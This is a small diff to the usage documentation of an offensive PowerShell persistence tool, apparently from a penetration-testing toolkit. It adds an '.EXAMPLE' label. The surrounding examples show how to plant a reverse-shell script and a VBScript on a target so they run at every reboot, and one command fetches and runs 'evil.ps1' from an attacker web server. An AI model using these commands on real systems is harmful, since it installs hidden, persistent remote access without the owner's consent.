@@ -40,6 +40,7 @@ PS > Add-Persistence -ScriptPath C:\test\Invoke-PowerShellTcpOneLine.ps1
 Use the above to drop the reverse shell PowerShell script and WindowsSanity.vbs on the target box. The VBscript file and thus the 
 PoWerShell payload will be executed on every reboot. Please note that C:\test\Invoke-PowerShellTcpOneLine.ps1 is the path on the target machine. 
 
+.EXAMPLE
 PS > Add-Persistence -PayloadURL http://yourwebserver/evil.ps1
 Use the above to download and execute in memory the evil.ps1 script everytime the target machine reboots. 
 
